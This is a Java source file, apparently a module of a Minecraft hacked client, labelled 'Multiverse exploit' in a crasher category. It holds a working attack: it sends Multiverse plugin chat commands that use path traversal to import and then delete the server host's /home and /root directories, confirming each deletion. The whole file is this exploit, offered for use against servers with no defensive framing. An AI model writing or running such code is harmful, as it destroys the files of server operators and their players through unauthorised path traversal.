package com.skidding.atlas.primitive.impl.exploit;

import com.skidding.atlas.module.ModuleCategory;
import com.skidding.atlas.primitive.PrimitiveFeature;
import com.skidding.atlas.util.minecraft.chat.ChatUtil;
import net.minecraft.network.play.client.C01PacketChatMessage;
import net.minecraftforge.client.model.TRSRTransformation;

import java.util.concurrent.TimeUnit;

public class MultiversePrimitive extends PrimitiveFeature {

    private static final String[] COMMANDS = {
            "/mv import ../../../../../home normal -t flat",
            "/mv import ../../../../../root normal -t flat",
            "/mv delete ../../../../../home",
            "/mv confirm",
            "/mv delete ../../../../../root",
            "/mv confirm"
    };

    public MultiversePrimitive() {
        super("Multiverse", "Multiverse exploit", ModuleCategory.CRASHER);
    }

    @Override
    public void execute(Object... args) {
        long start = System.currentTimeMillis();

        try {
            for(String command : COMMANDS) {
                getPlayer().sendQueue.addToSendQueue(new C01PacketChatMessage(command));
                TimeUnit.SECONDS.sleep(1);
            }
        } catch (Exception e) {
            ChatUtil.print(STR."Execution failed in \{System.currentTimeMillis() - start}ms");
        }
    }

}
